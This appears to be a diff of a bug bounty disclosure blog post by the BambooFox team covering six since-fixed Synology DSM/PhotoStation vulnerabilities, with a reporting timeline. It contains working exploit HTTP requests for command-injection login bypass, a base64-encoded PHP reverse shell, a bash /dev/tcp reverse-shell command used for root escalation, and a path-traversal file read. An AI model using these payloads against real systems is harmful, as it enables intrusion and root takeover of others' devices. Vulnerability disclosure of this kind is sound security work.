@@ -1,23 +1,41 @@
+---
 title: '[Synology Bug Bounty 2016]'
-author: 'bananaapple,0Alien0'
-date: 2017-03-20 07:28:13
+author: BambooFox
 tags:
+  - web
+  - 'Synology Bug Bounty '
+  - bug bounty
+  - DoS
+  - LFI
+  - command injection
+categories:
+  - write-ups
+  - bug-bounty-report
+date: 2017-03-20 07:28:00
 ---
-Synology Bug Bounty 
+Synology Bug Bounty Report
 =============
-Author: BambooFox
 
-In last year(2016), our team BambooFox is invited to Synology Bug Bounty. During about 2 mouth hacking, several vulnerabilities are discovered, include a remote root vuln. Enginners in Synology response and fix these vuln in a very sort time, which shows they pay a lot of attension for security issue.
+> Author: BambooFox Team 
+> ( Henry, jpeanut, ding, leepupu, Angelboy, boik, adr, Mango King, Bletchley )
 
-For now(2017), we are permitted to disclosure the vulnerabilities.
+Last year ( 2016 ) , we BambooFox are invited to join the Synology Bug Bounty program. After about 2 months of hacking, we discovered several vulnerabilities, including a **remote root code execution** vulnerability. Synology engineers response and fix the vulnerabilities in a very sort time, which shows they pay a lot of attention to  security issues.
 
-Vul-01: PhotoStation Login without password
+And now ( in 2017 ) , we are allowed to publish the vulnerabilities:  
+* [Vul-01 PhotoStation Login without password](#Vul-01-PhotoStation-Login-without-password )
+* [Vul-02 PhotoStation Remote Code Execution](#Vul-02-PhotoStation-Remote-Code-Execution)
+* [Vul-03 Read-Write Arbitrary Files](#Vul-03-Read-Write-Arbitrary-Files)
+* [Vul-04 Privilege Escalation](#Vul-04-Privilege-Escalation)
+* [Vul-05 DoS via Blocking IP](#Vul-05-DoS-via-Blocking-IP)
+* [Vul-06 Local File Inclusion](#Vul-06-Local-File-Inclusion)
+
+## Vul-01: PhotoStation Login without password
 ---
-We mostly focus on PhotoStation, which is the picture management system enabled in most Synology DSM.
+We mostly focus on **PhotoStation**, which is the picture management system enabled in most Synology DSM ( DiskStation Manager ).
 
-The first vuln is unauthenticated login without password.
+The first vulnerability allowed us to **login as admin without entering the password.**
 
-POC1:
+PoC1:
 ```
 GET //photo/login.php?usr=admin&sid=xxx&SynoToken=/bin/true HTTP/1.1
 Host: bamboofox.hopto.org
@@ -30,31 +48,28 @@ Cookie: stay_login=0; language=en; PHPSESSID=ime6mqrg0pghbjo4p9aomqcbv0; left-pa
 Connection: close
 ```
 
-The key points of POC1 are '|' in X-Forwarded-For field and SynoToken.
-We found that server site CGI will concate user, X-Forwarded-For and SynoToken into command and execute this command.
-But the special characters '|' and '>' is not correctly filter out. 
+The key points are the `|` character in the `X-Forwarded-For` field and `/bin/true` in the get parameter `SynoToken`. The server site CGI will concatenate the strings in `usr`, `X-Forwarded-For` and `SynoToken` into a command and execute the command, and the special characters `|` and `>` aren't filtered out correctly, which will lead to the **command injection** vulnerability. 
 
-Therefore in our POC1, the command will become
+Therefore in our PoC1, the command will become:
 ```
 /usr/syno/bin/synophoto_dsm_user username | /bin/true
 ```
 
-This command returns 0(True) and bypasses the authentication.
+The command will return 0 (True) and thus bypass the authentication.
 
-**Expected Result:
+**Result:
 Adversary can login as admin without password**
 
 ![Login without password](http://i.imgur.com/pnIWZ6t.png)
 
-Vul-02: PhotoStation Remote Code Execution
+## Vul-02: PhotoStation Remote Code Execution
 ---
-After first attemp to login success, 
-we futher extend out attack for remote code execution.
+After we successfully login as admin via the command injection vulnerability, we extended the attack surface to attempt remote code execution.
 
-POC2: 
-1 . Encode the command you want in base64
+PoC2: 
+1 . Encode the command into base64 format
 ```
-$sock=fsockopen("......",8080);exec("/bin/sh -i <&3 >&3 2>&3");
+base64encode( $sock=fsockopen("......",8080);exec("/bin/sh -i <&3 >&3 2>&3"); )
 => JHNvY2s9ZnNvY2tvcGVuKCIzNi4yMzEuNjguMjE1Iiw4MDgwKTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOw==
 ```
 
@@ -71,9 +86,10 @@ Cookie: stay_login=0; language=en; PHPSESSID=ime6mqrg0pghbjo4p9aomqcbv0; left-pa
 Connection: close
 ```
 
-In POC2, the similar approach is taken to achieve RCE.
-Loop more deep to the PhotoStation source code. We can find following code.
-```
+We adopted a similar approach (PoC1) in order to achieve RCE.
+
+We then took a deep look into the source code of PhotoStation, and found the following  code:
+```php
 if ($x_forward) {
     $ip = $x_forward;
 }
@@ -87,41 +103,53 @@ if ($retval === 0) {
 }
 ```
 
-In this code snippet, $user, $ip and $synotoken can be easily controlled by HTTP header. Thus we can try command injection. However our first attempt fails due to something is filtering out. But we also notice that some special char is not filtered. The code here shows that.
-```
+In this code snippet, `$user`, `$ip` and `$synotoken` can be easily controlled by crafting the HTTP headers, and that's the original cause of the command injection vulnerability.  
+Our first few attempts failed due to the site filtered out some special characters. However, we noticed that the site did not filtered out all the special characters. Here's the code that indicated the non-filtered characters:
+```php
 static $skipEscape = array('>', '<', '|', '&');
 ```
 
-As result, '>', '<', '|', '&' can used to cause command injection.
+As a result of the code above, `>`, `<`, `|` and `&` can be used to achieve command injection.
 
 ![Remote Code Execution](http://i.imgur.com/qJxpKq8.png)
 
-Vul-03: Arbitrary Read/Write Files
+## Vul-03: Read-Write Arbitrary Files
 ---
-After the shell gotten. We continue to find flaw in the DSM. The binary program synophoto_dsm_user gets our attension. This binary is **suid** and has a powerful copy function. Thus we can use this binary to   arbitrary read/write files.
+After we got the shell, we continued to find security flaws in the DSM. The binary program `synophoto_dsm_user` got our attention. This binary is a **setuid program**, and has a powerful copy function.  
+With the `--copy` parameter, it will do the `cp` command and **copy a file with the root permission**. This make us have the ability to read/write an arbitrary file .
 
-Vul-04: Get Root 
+## Vul-04: Privilege Escalation
 ---
-With previous 3 vuln, now we can start to remote root. We first try to modify crontab, but fails due to apparmor protection. So we move to other place that crontab will invoke it. 
-We finally find the '/tmp/synoschedtask' that will be invoked by crontab as root. Therefore we use synophoto_dsm_user to modify the content as follow:
+With the previous Vul-03, we can exploit the vulnerability and **escalate our privilege to root**. We first tried modify the `/etc/crontab` file, but failed due to the [AppArmor](https://en.wikipedia.org/wiki/AppArmor) protection. So we change our target to the file that will be invoked by crontab. Finally we found `/tmp/synoschedtask`, a task which will be invoked by crontab as root. We use `synophoto_dsm_user` to modify its file content to the following command:
 ```
 /volume1/photo/bash -c '/volume1/photo/bash -i >& /dev/tcp/x.x.x.x/yyyyy 0>&1'
 ```
 
-Then we can now wait for reverse shell.
+Now we can wait for our reverse shell, with the root permission.
 ![Remote Code Execution](http://i.imgur.com/5YrQU54.jpg)
 
-Vul-05: forget_passwd.cgi DOS via Blocking IP
+## Vul-05: DoS via Blocking IP
 ---
-Besides remote root vuln, we also find other security flaws. Here os the LFI vuln.
-
-forget_passwd.cgis use X-Forwarded-For to block user IP. If a user sends request to  forget_passwd.cgi too fast, the user will be blocked by it's IP.
-But X-Forwarded-For can be easily forged in client site. Thus attacker can block any user by it's IP. 
-Moreover, attack can enumerate all the ip to DOS DSM.
+We also found some other security flaws.
+If a user sends too many requests to `forget_passwd.cgi`, the user will be blocked by his IP, which is retrieved from the `X-Forwarded-For` header.
+However, `X-Forwarded-For` can be easily forged from the client side, therefore an attacker can block as many user as he want by forging the `X-Forwarded-For` header, leading a DoS attack.
 ![Block IP](http://i.imgur.com/aU9IDWm.png)
 
-Vul-06:  PhotoStation Download.php Local File Inclusion
+## Vul-06: Local File Inclusion
 ---
-The download.php have local file inclusion problem. The parameter id is controllable. As example, we can use "../../../../../../var/services/homes/[username]/.gitconfig" to download user's file.
+There's a LFI (Local File Inclusion) vulnerability in `download.php`. The `id` parameter is controllable.  
+For example, we can use `../../../../../../var/services/homes/[username]/.gitconfig` to download a user's git config file.
 
-![Local File Inclusion](http://i.imgur.com/ZpL5Tw7.png)
+![Local File Inclusion](http://i.imgur.com/ZpL5Tw7.png)  
+
+
+
+## Timeline
+* 2016/07/25 Report vulnerabilities to Synology
+* 2016/09/01 Confirm that all vulnerabilities has already been fixed by Synology
+* 2017/03/13 Confirm that we're allowed to publish the bug bounty report
+* 2017/03/20 Synology Bug Bounty Report published
+
+
+## Note
+Some of the vulnerability has already been discovered by Lucas Leong from Trend Micro ( [link](http://seclists.org/oss-sec/2016/q1/236) )
